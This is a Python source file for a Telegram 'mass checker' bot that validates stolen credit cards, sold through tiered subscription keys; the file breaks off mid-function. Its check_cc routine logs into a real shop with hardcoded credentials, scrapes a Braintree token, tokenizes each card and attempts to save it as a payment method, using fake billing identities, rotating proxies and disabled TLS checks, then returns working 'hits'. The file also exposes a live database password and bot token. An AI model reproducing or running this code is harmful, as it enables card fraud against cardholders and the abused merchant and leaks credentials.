import asyncio
import logging
import os
from datetime import datetime, timedelta
import random
import string
import time
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import motor.motor_asyncio
from bs4 import BeautifulSoup
import re
import base64
import user_agent
from collections import defaultdict, deque
import ssl

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# MongoDB setup
try:
    client = motor.motor_asyncio.AsyncIOMotorClient(os.getenv('MONGODB_URI', 'mongodb+srv://ElectraOp:BGMI272@cluster0.1jmwb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0'))
    db = client['fn_mass_checker']
    users_collection = db['users']
    keys_collection = db['keys']
except Exception as e:
    logger.error(f"Failed to connect to MongoDB: {e}")
    raise

# Bot token
TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8009942983:AAHNNyYZwTooBL09nyRWff4gVdTVYCLNyjI')
OWNER_ID = 7593550190  # Replace with your Telegram ID

# Proxy settings
PROXY = False
try:
    with open('proxies.txt', 'r') as f:
        PROXY_LIST = [line.strip() for line in f.readlines() if line.strip()]
except FileNotFoundError:
    PROXY_LIST = []
    if PROXY:
        logger.error("proxies.txt not found. Please provide a valid proxies.txt file.")
user = user_agent.generate_user_agent()

# Create a custom SSL context to bypass verification
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

# Tiers
TIERS = {'Gold': 500, 'Platinum': 1000, 'Owner': 3000}

# Task management
check_queue = asyncio.Queue()  # Global queue for single checks
active_single_tasks = set()  # Active single check tasks
user_queues = defaultdict(deque)  # Per-user queues for bulk checks
user_active_tasks = defaultdict(set)  # Per-user active bulk tasks
user_cooldowns = {}  # Per-user cooldown timestamps
bulk_progress = {}  # Track bulk check progress
stop_checking = {}  # Track stop requests per user
COOLDOWN_SECONDS = 70
MAX_CONCURRENT_PER_USER = 3
MAX_CONCURRENT_SINGLE = 3

async def get_user(user_id):
    try:
        user = await users_collection.find_one({'user_id': user_id})
        return user
    except Exception as e:
        logger.error(f"Error fetching user {user_id}: {e}")
        return None

async def update_user(user_id, data):
    try:
        await users_collection.update_one({'user_id': user_id}, {'$set': data}, upsert=True)
    except Exception as e:
        logger.error(f"Error updating user {user_id}: {e}")

async def delete_user_subscription(user_id):
    try:
        await users_collection.update_one(
            {'user_id': user_id},
            {'$unset': {'tier': "", 'expiration': "", 'cc_limit': "", 'checked': ""}}
        )
    except Exception as e:
        logger.error(f"Error deleting subscription for user {user_id}: {e}")

async def generate_key(tier, duration_days):
    try:
        key = f"FN-B3-{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}"
        await keys_collection.insert_one({'key': key, 'tier': tier, 'duration_days': duration_days, 'redeemed': False})
        return key
    except Exception as e:
        logger.error(f"Error generating key: {e}")
        return None

async def redeem_key(user_id, key):
    try:
        key_data = await keys_collection.find_one({'key': key, 'redeemed': False})
        if key_data:
            tier = key_data['tier']
            duration_days = key_data['duration_days']
            expiration = datetime.now() + timedelta(days=duration_days)
            await update_user(user_id, {'tier': tier, 'expiration': expiration, 'cc_limit': TIERS[tier], 'checked': 0})
            await keys_collection.update_one({'key': key}, {'$set': {'redeemed': True}})
            return tier, duration_days
        return None
    except Exception as e:
        logger.error(f"Error redeeming key for user {user_id}: {e}")
        return None

def generate_full_name():
    first = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah"]
    last = ["Khalil", "Abdullah", "Smith", "Johnson", "Williams"]
    return random.choice(first), random.choice(last)

def generate_address():
    cities = ["New York", "Los Angeles"]
    streets = ["Main St", "Park Ave"]
    zips = ["10002", "90001"]
    city = random.choice(cities)
    state = 'NY' if city == "New York" else 'CA'
    return city, state, f"{random.randint(100, 999)} {random.choice(streets)}", random.choice(zips)

def generate_email():
    return ''.join(random.choices(string.ascii_lowercase, k=10)) + "@gmail.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=15))

def generate_phone():
    return "303" + ''.join(random.choices(string.digits, k=7))

def generate_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

async def get_bin_details(bin_number):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
                if response.status == 200:
                    data = await response.json()
                    bank = data.get('bank', 'Unknown')
                    card_type = data.get('brand', 'Unknown').capitalize()
                    card_level = data.get('level', 'Unknown')
                    card_type_category = data.get('type', 'Unknown')
                    country_name = data.get('country_name', '')
                    country_flag = data.get('country_flag', '')
                    return bank, card_type, card_level, card_type_category, country_name, country_flag
                else:
                    return "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", ""
    except aiohttp.ClientError as e:
        logger.error(f"Error fetching BIN details: {e}")
        return "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", ""

async def test_proxy(proxy_url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                "https://www.google.com",
                proxy=proxy_url,
                timeout=5,
                headers={'user-agent': user},
                ssl=ssl_context
            ) as response:
                return response.status == 200
    except (aiohttp.ClientError, asyncio.TimeoutError):
        return False

async def check_cc(cc_details):
    try:
        cc, mes, ano, cvv = cc_details.split('|')
        if len(mes) == 1: mes = f'0{mes}'
        if not ano.startswith('20'): ano = f'20{ano}'
        full = f"{cc}|{mes}|{ano}|{cvv}"

        bin_number = cc[:6]
        issuer, card_type, card_level, card_type_category, country_name, country_flag = await get_bin_details(bin_number)

        # Determine card type for form
        card_type_lower = card_type.lower()
        card_type_map = {
            'visa': 'visa',
            'mastercard': 'master-card',
            'american express': 'american-express',
            'discover': 'discover'
        }
        card_type_for_form = next((value for key, value in card_type_map.items() if key in card_type_lower), 'master-card')

        start_time = time.time()
        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        acc = generate_email()
        username = generate_username()
        num = generate_phone()

        headers = {
            'user-agent': user,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'referer': 'https://boltlaundry.com/'
        }
        proxy_status = "None"
        proxy_url = None
        if PROXY and PROXY_LIST:
            proxy_url = random.choice(PROXY_LIST)
            is_proxy_alive = await test_proxy(proxy_url)
            proxy_status = "Live✅" if is_proxy_alive else "Dead❌"
        proxy_param = proxy_url if proxy_url and is_proxy_alive else None

        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
            # Step 1: Get login nonce
            async with session.get('https://boltlaundry.com/loginnow/', headers=headers, proxy=proxy_param) as r:
                text = await r.text()
                soup = BeautifulSoup(text, 'html.parser')
                ihc_nonce_tag = soup.find('input', {'name': 'ihc_login_nonce'})
                if not ihc_nonce_tag or 'value' not in ihc_nonce_tag.attrs:
                    logger.error(f"Login page content: {text[:500]}...")  # Log partial content for debugging
                    raise ValueError("Could not find login nonce")
                nonce = ihc_nonce_tag['value']

            # Step 2: Login
            data = {
                'ihcaction': 'login',
                'ihc_login_nonce': nonce,
                'log': 'ElectraOp',
                'pwd': 'ElectraOp272999',
            }
            async with session.post('https://boltlaundry.com/loginnow/', headers=headers, data=data, proxy=proxy_param) as r:
                pass

            # Step 3: Update billing address with retry
            for attempt in range(2):  # Retry once
                async with session.get('https://boltlaundry.com/my-account/edit-address/billing/', headers=headers, proxy=proxy_param) as r:
                    text = await r.text()
                    soup = BeautifulSoup(text, 'html.parser')
                    address_nonce_tag = soup.find('input', {'name': 'woocommerce-edit-address-nonce'})
                    if address_nonce_tag and 'value' in address_nonce_tag.attrs:
                        address_nonce = address_nonce_tag['value']
                        break
                    else:
                        logger.error(f"Attempt {attempt + 1}: Could not find address nonce. Page content: {text[:500]}...")
                        if attempt == 1:
                            raise ValueError("Could not find address nonce")
                        await asyncio.sleep(1)  # Wait before retry

            data = {
                'billing_first_name': first_name,
                'billing_last_name': last_name,
                'billing_company': '',
                'billing_country': 'US',
                'billing_address_1': street_address,
                'billing_address_2': '',
                'billing_city': city,
                'billing_state': state,
                'billing_postcode': zip_code,
                'billing_phone': num,
                'billing_email': acc,
                'save_address': 'Save address',
                'woocommerce-edit-address-nonce': address_nonce,
                '_wp_http_referer': '/my-account/edit-address/billing/',
                'action': 'edit_address'
            }
            async with session.post('https://boltlaundry.com/my-account/edit-address/billing/', headers=headers, data=data, proxy=proxy_param) as r:
                pass

            # Step 4: Access add-payment-method page
            async with session.get('https://boltlaundry.com/my-account/add-payment-method/', headers=headers, proxy=proxy_param) as r:
                text = await r.text()
                soup = BeautifulSoup(text, 'html.parser')
                nonce1 = soup.find(id="woocommerce-add-payment-method-nonce")
                if not nonce1 or 'value' not in nonce1.attrs:
                    logger.error(f"Payment page content: {text[:500]}...")
                    raise ValueError("Could not find payment nonce")

                token_js = re.search(r'var wc_braintree_client_token\s*=\s*\[\s*"([^"]+)"\s*\];', text)
                if not token_js:
                    logger.error(f"Payment page content: {text[:500]}...")
                    raise ValueError("Braintree token not found")
                b64_token = token_js.group(1)

                try:
                    decoded = base64.b64decode(b64_token).decode('utf-8')
                except Exception:
                    raise ValueError("Could not decode Braintree token")

                fingerprint_match = re.search(r'"authorizationFingerprint":"([^"]+)"', decoded)
                if not fingerprint_match:
                    raise ValueError("Authorization fingerprint not found")
                auth_token = fingerprint_match.group(1)

            # Step 5: Tokenize card
            tokenize_headers = {
                'authorization': f'Bearer {auth_token}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': user
            }
            payload = {
                'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': generate_code(36)},
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { last4 }}}',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mes,
                            'expirationYear': ano,
                            'cvv': cvv,
                            'billingAddress': {'postalCode': '10080', 'streetAddress': '323 E Pine St'},
                        },
                        'options': {'validate': False},
                    }
                }
            }
            async with session.post('https://payments.braintree-api.com/graphql', headers=tokenize_headers, json=payload, proxy=proxy_param) as r:
                response_json = await r.json()
                if 'errors' in response_json:
                    raise ValueError("Tokenization failed")
                tok = response_json.get('data', {}).get('tokenizeCreditCard', {}).get('token')
                if not tok:
                    raise ValueError("Could not tokenize credit card")

            # Step 6: Add card
            headers.update({
                'authority': 'boltlaundry.com',
                'content-type': 'application/x-www-form-urlencoded',
            })
            data = {
                'payment_method': 'braintree_cc',
                'braintree_cc_nonce_key': tok,
                'braintree_cc_device_data': '',
                'braintree_cc_3ds_nonce_key': '',
                'braintree_cc_config_data': '{"environment":"production"}',
                'woocommerce-add-payment-method-nonce': nonce1['value'],
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
            }
            async with session.post('https://boltlaundry.com/my-account/add-payment-method/', headers=headers, data=data, proxy=proxy_param) as response:
                text = await response.text()
                soup = BeautifulSoup(text, 'html.parser')
                error_ul = soup.find('ul', class_='woocommerce-error')

                if error_ul:
                    full_text = error_ul.get_text(strip=True)
                    match = re.search(r'Reason:\s*(.*)', full_text)
                    msg = match.group(1) if match else full_text

                    approved_keywords = ['CVV.', 'CVV matched', 'CVV pass']
                    if any(kw in msg for kw in approved_keywords):
                        msg = 'CVV Matched ✅'
                        status = 'approved'
                    else:
                        status = 'declined'
                else:
                    msg = "Card added successfully"
                    status = 'approved'

        time_taken = time.time() - start_time
        result = {
            'card': full,
            'message': msg,
            'time_taken': time_taken,
            'proxy_status': proxy_status,
            'issuer': issuer,
            'card_type': card_type,
            'card_level': card_level,
            'card_type_category': card_type_category,
            'country_name': country_name,
            'country_flag': country_flag,
            'status': status
        }

        if 'Card Issuer Declined CVV' in text:
            result['status'] = 'ccn'
            result['message'] = 'Card Issuer Declined CVV'

        return result
    except aiohttp.ClientSSLError as ssl_err:
        logger.error(f"SSL Error checking CC {cc_details}: {ssl_err}")
        return {
            'card': full,
            'status': 'error',
            'message': f"SSL Error: {str(ssl_err)}",
            'time_taken': time.time() - start_time,
            'proxy_status': proxy_status,
            'issuer': issuer,
            'card_type': card_type,
            'card_level': card_level,
            'card_type_category': card_type_category,
            'country_name': country_name,
            'country_flag': country_flag
        }
    except Exception as e:
        logger.error(f"Error checking CC {cc_details}: {e}")
        return {
            'card': full,
            'status': 'error',
            'message': str(e),
            'time_taken': time.time() - start_time,
            'proxy_status': proxy_status,
            'issuer': issuer,
            'card_type': card_type,
            'card_level': card_level,
            'card_type_category': card_type_category,
            'country_name': country_name,
            'country_flag': country_flag
        }

async def process_single_checks():
    while True:
        try:
            done_tasks = [task for task in active_single_tasks if task.done()]
            for task in done_tasks:
                active_single_tasks.remove(task)
            while len(active_single_tasks) < MAX_CONCURRENT_SINGLE and not check_queue.empty():
                user_id, cc_details, update, context, is_bulk, bulk_id = await check_queue.get()
                if stop_checking.get(user_id, False):
                    continue
                task = asyncio.create_task(single_check(user_id, cc_details, update, context, is_bulk, bulk_id))
                active_single_tasks.add(task)
            await asyncio.sleep(1)
        except Exception as e:
            logger.error(f"Error in process_single_checks: {e}")
            await asyncio.sleep(1)

async def process_user_checks():
    while True:
        try:
            for user_id in list(user_queues):
                if stop_checking.get(user_id, False):
                    user_queues[user_id].clear()
                    continue
                if user_id in user_cooldowns:
                    if time.time() < user_cooldowns[user_id]:
                        continue
                    else:
                        del user_cooldowns[user_id]
                queue = user_queues[user_id]
                active_tasks = user_active_tasks[user_id]
                done_tasks = [task for task in active_tasks if task.done()]
                for task in done_tasks:
                    active_tasks.remove(task)
                while len(active_tasks) < MAX_CONCURRENT_PER_USER and queue:
                    item = queue.popleft()
                    task = asyncio.create_task(single_check(*item))
                    active_tasks.add(task)
                if len(active_tasks) == MAX_CONCURRENT_PER_USER and len(done_tasks) == 0:
                    user_cooldowns[user_id] = time.time() + COOLDOWN_SECONDS
            await asyncio.sleep(1)
        except Exception as e:
            logger.error(f"Error in process_user_checks: {e}")
            await asyncio.sleep(1)

async def single_check(user_id, cc_details, update, context, is_bulk, bulk_id):
    try:
        if is_bulk and bulk_id in bulk_progress:
            async with bulk_progress[bulk_id]['lock']:
                if bulk_progress[bulk_id]['stopped']:
                    bulk_progress[bulk_id]['pending'] -= 1
                    if bulk_progress[bulk_id]['pending'] == 0:
                        await send_final_message(user_id, bulk_id, context)
                    return
        user = await get_user(user_id)
        checking_msg = None
        if not is_bulk:
            checking_msg = await update.message.reply_text("Checking Your Cc Please Wait..")
        result = await check_cc(cc_details)
        if checking_msg:
            await checking_msg.delete()
        card_info = f"{result['card_type']} {{ {result['card_level']} }} {{ {result['card_type_category']} }}"
        issuer = result['issuer']
        country_display = f"{result['country_name']} {result['country_flag']}" if result['country_flag'] else result['country_name']
        checked_by = f"<a href='tg://user?id={user_id}'>{user_id}</a>"
        tier = user['tier'] if user else "None"
        if result['status'] == 'approved':
            msg = (f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n\n"
                   f"[ϟ]𝗖𝗮𝗿𝗱 -» <code>{result['card']}</code>\n"
                   f"[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Braintree Auth\n"
                   f"[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» {result['message']}\n\n"
                   f"[ϟ]𝗜𝗻𝗳𝗼 -» {card_info}\n"
                   f"[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛\n"
                   f"[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country_display}\n\n"
                   f"[⌬]𝗧𝗶𝗺𝗲 -» {result['time_taken']:.2f} seconds\n"
                   f"[⌬]𝗣𝗿𝗼𝘅𝘆 -» {result['proxy_status']}\n"
                   f"[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» {checked_by} {tier}\n"
                   f"[み]𝗕𝗼𝘁 -» <a href='tg://user?id=8009942983'>𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃</a>")
            if is_bulk:
                await context.bot.send_message(chat_id=update.message.chat_id, text=msg, parse_mode='HTML')
            else:
                await update.message.reply_text(msg, parse_mode='HTML')
        elif result['status'] == 'ccn' and not is_bulk:
            msg = (f"𝐂𝐂𝐍 ✅\n\n"
                   f"[ϟ]𝗖𝗮𝗿𝗱 -» <code>{result['card']}</code>\n"
                   f"[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Braintree Auth\n"
                   f"[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» {result['message']}\n\n"
                   f"[ϟ]𝗜𝗻𝗳𝗼 -» {card_info}\n"
                   f"[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛\n"
                   f"[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country_display}\n\n"
                   f"[⌬]𝗧𝗶𝗺𝗲 -» {result['time_taken']:.2f} seconds\n"
                   f"[⌬]𝗣𝗿𝗼𝘅𝘆 -» {result['proxy_status']}\n"
                   f"[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» {checked_by} {tier}\n"
                   f"[み]𝗕𝗼𝘁 -» <a href='tg://user?id=8009942983'>𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃</a>")
            await update.message.reply_text(msg, parse_mode='HTML')
        elif result['status'] == 'declined' and not is_bulk:
            msg = (f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n\n"
                   f"[ϟ]𝗖𝗮𝗿𝗱 -» <code>{result['card']}</code>\n"
                   f"[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Braintree Auth\n"
                   f"[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» {result['message']}\n\n"
                   f"[ϟ]𝗜𝗻𝗳𝗼 -» {card_info}\n"
                   f"[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛\n"
                   f"[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country_display}\n\n"
                   f"[⌬]𝗧𝗶𝗺𝗲 -» {result['time_taken']:.2f} seconds\n"
                   f"[⌬]𝗣𝗿𝗼𝘅𝘆 -» {result['proxy_status']}\n"
                   f"[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» {checked_by} {tier}\n"
                   f"[み]𝗕𝗼𝘁 -» <a href='tg://user?id=8009942983'>𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃</a>")
            await update.message.reply_text(msg, parse_mode='HTML')
        if is_bulk and bulk_id in bulk_progress:
            progress = bulk_progress[bulk_id]
            async with progress['lock']:
                last_response = result['message']
                if result['status'] == 'approved':
                    progress['approved'] += 1
                    progress['hits'].append(result['card'])
                elif result['status'] in ['declined', 'ccn']:
                    progress['declined'] += 1
                    if result['status'] == 'ccn':
                        progress['hits'].append(result['card'])
                progress['pending'] -= 1
                approved = progress['approved']
                declined = progress['declined']
                total = progress['total']
                max_response_length = 64 - len("Response💎: ")
                last_response_display = last_response[:max_response_length - 3] + "..." if len(last_response) > max_response_length else last_response
                progress_text = (
                    f"🔎 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐂𝐚𝐫𝐝𝐬...\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"[み] 𝐁𝐨𝐭: @FN_B3_AUTH\n"
                    f"[✅] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {approved}\n"
                    f"[❌] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {declined}\n"
                    f"[💳] 𝐓𝐨𝐭𝐚𝐥: {total}\n"
                    f"[💎] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {last_response_display}"
                )
                keyboard = [
                    [InlineKeyboardButton(f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝✅: {approved}", callback_data='view_approved')],
                    [InlineKeyboardButton(f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝❌: {declined}", callback_data='view_declined')],
                    [InlineKeyboardButton(f"𝐓𝐨𝐭𝐚𝐥💳: {total}", callback_data='view_total')],
                    [InlineKeyboardButton("𝐒𝐭𝐨𝐩🔴", callback_data=f'stop_checking_{bulk_id}')],
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                await progress['msg'].edit_text(progress_text, reply_markup=reply_markup, parse_mode='HTML')
                if progress['pending'] == 0 and not progress['completed']:
                    progress['completed'] = True
                    await send_final_message(user_id, bulk_id, context)
        if user:
            await update_user(user_id, {'checked': user.get('checked', 0) + 1})
    except asyncio.CancelledError:
        logger.info(f"Task for user {user_id} cancelled")
    except Exception as e:
        logger.error(f"Error in single_check for user {user_id}: {e}")
        if not is_bulk:
            await update.message.reply_text(f"Error checking card: {str(e)}", parse_mode='HTML')

async def send_final_message(user_id, bulk_id, context):
    try:
        progress = bulk_progress[bulk_id]
        approved = progress['approved']
        declined = progress['declined']
        total = progress['total']
        hits = progress['hits']
        duration = time.time() - progress['start_time']
        speed = total / duration if duration > 0 else 0
        success_rate = (approved / total * 100) if total > 0 else 0
        context.user_data['approved'] = approved
        context.user_data['declined'] = declined
        context.user_data['total'] = total
        hit_file = f"fn-b3-hits-{random.randint(1000, 9999)}.txt"
        try:
            with open(hit_file, 'w') as f:
                f.write('\n'.join(hits))
            with open(hit_file, 'rb') as f:
                keyboard = [
                    [InlineKeyboardButton(f"Approved✅: {approved}", callback_data='view_approved')],
                    [InlineKeyboardButton(f"Declined❌: {declined}", callback_data='view_declined')],
                    [InlineKeyboardButton(f"Total💳: {total}", callback_data='view_total')]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                await context.bot.send_document(
                    chat_id=progress['msg'].chat_id,
                    document=f,
                    caption=(
                        f"[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐇𝐈𝐓𝐒 😈⚡\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"[✪] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {approved}\n"
                        f"[❌] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {declined}\n"
                        f"[✪] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝: {approved + declined}/{total}\n"
                        f"[✪] 𝐓𝐨𝐭𝐚𝐥: {total}\n"
                        f"[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration:.2f} seconds\n"
                        f"[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {speed:.2f} cards/sec\n"
                        f"[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: {success_rate:.1f}%\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"[み] 𝐃𝐞𝐯: <a href='tg://user?id=7593550190'>𓆰𝅃꯭᳚⚡!! ⏤‌𝐅ɴ x 𝐄ʟᴇᴄᴛʀᴀ𓆪𓆪⏤‌➤⃟🔥</a>"
                    ),
                    parse_mode='HTML',
                    reply_markup=reply_markup
                )
        finally:
            if os.path.exists(hit_file):
                os.remove(hit_file)
        del bulk_progress[bulk_id]
        if user_id in user_queues:
            user_queues[user_id].clear()
    except Exception as e:
        logger.error(f"Error in send_final_message for user {user_id}: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        keyboard = [
            [InlineKeyboardButton("Upload Files", callback_data='upload_files')],
            [InlineKeyboardButton("Cancel Check", callback_data='cancel_check')],
            [InlineKeyboardButton("Help", callback_data='help')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "🔥 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐅𝐍 𝐌𝐀𝐒𝐒 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐁𝐎𝐓!\n\n"
            "🔥 𝐔𝐬𝐞 /chk 𝐓𝐨 𝐂𝐡𝐞𝐜𝐤 𝐒𝐢𝐧𝐧𝐥𝐞 𝐂𝐂\n\n"
            "🔥 𝐔𝐬𝐞 /stop 𝐓𝐨 𝐒𝐭𝐨𝐩 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠\n\n"
            "📁 𝐒𝐞𝐧𝐝 𝐂𝐨𝐦𝐛𝐨 𝐅𝐢𝐥𝐞 𝐎𝐫 𝐄𝐥𝐬𝐞 𝐔𝐬𝐞 𝐁𝐮𝐭𝐭𝐨𝐧 𝐁𝐞𝐥𝐰𝐨:",
            reply_markup=reply_markup
        )
    except Exception as e:
        logger.error(f"Error in start command: {e}")
        await update.message.reply_text("An error occurred. Please try again.")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        stop_checking[user_id] = True
        if user_id in user_queues:
            user_queues[user_id].clear()
        for task in list(user_active_tasks[user_id]):
            task.cancel()
        user_active_tasks[user_id].clear()
        if user_id in user_cooldowns:
            del user_cooldowns[user_id]
        await update.message.reply_text("Checking Stopped 🔴")
    except Exception as e:
        logger.error(f"Error in stop command: {e}")
        await update.message.reply_text("An error occurred while stopping. Please try again.")

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        user = await get_user(user_id)
        if not user or user['expiration'] < datetime.now():
            await update.message.reply_text("You don't have an active subscription. Please redeem a key with /redeem <key>.")
            return
        cc_details = ' '.join(context.args)
        if not cc_details or len(cc_details.split('|')) != 4:
            await update.message.reply_text("Please provide CC details in the format: /chk 4242424242424242|02|27|042")
            return
        await check_queue.put((user_id, cc_details, update, context, False, None))
    except Exception as e:
        logger.error(f"Error in chk command: {e}")
        await update.message.reply_text("An error occurred. Please check the format and try again.")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        if query.data == 'upload_files':
            await query.message.reply_text("Send Your Txt File For Checking")
        elif query.data == 'cancel_check':
            stop_checking[user_id] = True
            if user_id in user_queues:
                user_queues[user_id].clear()
            for task in list(user_active_tasks[user_id]):
                task.cancel()
            user_active_tasks[user_id].clear()
            if user_id in user_cooldowns:
                del user_cooldowns[user_id]
            await query.message.reply_text("Checking Cancelled ❌")
        elif query.data == 'help':
            await query.message.reply_text("Use /chk to check a single CC or upload a text file for bulk checking.")
        elif query.data == 'view_approved':
            await query.message.reply_text(f"Approved cards: {context.user_data.get('approved', 0)}")
        elif query.data == 'view_declined':
            await query.message.reply_text(f"Declined cards: {context.user_data.get('declined', 0)}")
        elif query.data == 'view_total':
            await query.message.reply_text(f"Total cards: {context.user_data.get('total', 0)}")
        elif query.data == 'view_response':
            pass
        elif query.data.startswith('stop_checking_'):
            bulk_id = query.data.split('_')[2]
            if bulk_id in bulk_progress:
                async with bulk_progress[bulk_id]['lock']:
                    bulk_progress[bulk_id]['stopped'] = True
                stop_checking[user_id] = True
                if user_id in user_queues:
                    user_queues[user_id].clear()
                for task in list(user_active_tasks[user_id]):
                    task.cancel()
                user_active_tasks[user_id].clear()
                if user_id in user_cooldowns:
                    del user_cooldowns[user_id]
                await query.message.reply_text("Checking Stopped 🔴")
    except Exception as e:
        logger.error(f"Error in button_callback: {e}")
        await query.message.reply_text("An error occurred. Please try again.")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        user = await get_user(user_id)
        if not user or user['expiration'] < datetime.now():
            await update.message.reply_text("You don't have an active subscription. Please redeem a key with /redeem <key>.")
            return
        file = await update.message.document.get_file()
        file_path = await file.download_to_drive(f"combo_{user_id}.txt")
        try:
            with open(file_path, 'r') as f:
                cc_list = [line.strip() for line in f.readlines() if len(line.strip().split('|')) == 4]
        finally:
            if os.path.exists(file_path):
                os.unlink(file_path)
        if not cc_list:
            await update.message.reply_text("No valid CCs found in the file. Ensure the format is: card|mm|yy|cvv")
            return
        if len(cc_list) > user['cc_limit']:
            await update.message.reply_text(f"Your tier ({user['tier']}) allows checking up to {user['cc_limit']} CCs at a time.")
            return
        stop_checking[user_id] = False
        bulk_id = str(random.randint(100000, 999999))
        total = len(cc_list)
        msg = await update.message.reply_text("🔎 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐂𝐚𝐫𝐝𝐬...")
        bulk_progress[bulk_id] = {
            'total': total,
            'approved': 0,
            'declined': 0,
            'hits': [],
            'msg': msg,
            'lock': asyncio.Lock(),
            'completed': False,
            'pending': total,
            'stopped': False,
            'start_time': time.time()
        }
        for cc_details in cc_list:
            user_queues[user_id].append((user_id, cc_details, update, context, True, bulk_id))
    except Exception as e:
        logger.error(f"Error in handle_file: {e}")
        await update.message.reply_text("An error occurred while processing the file. Please try again.")

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.message.from_user.id != OWNER_ID:
            await update.message.reply_text("You are not authorized to use this command.")
            return
        try:
            tier, duration, quantity = context.args
            duration = int(duration.replace('d', ''))
            quantity = int(quantity)
            if tier not in TIERS:
                raise ValueError
        except:
            await update.message.reply_text("Usage: /genkey <tier> <duration> <quantity>\nExample: /genkey Gold 1d 5")
            return
        keys = [await generate_key(tier, duration) for _ in range(quantity)]
        if None in keys:
            await update.message.reply_text("Failed to generate one or more keys.")
            return
        await update.message.reply_text(
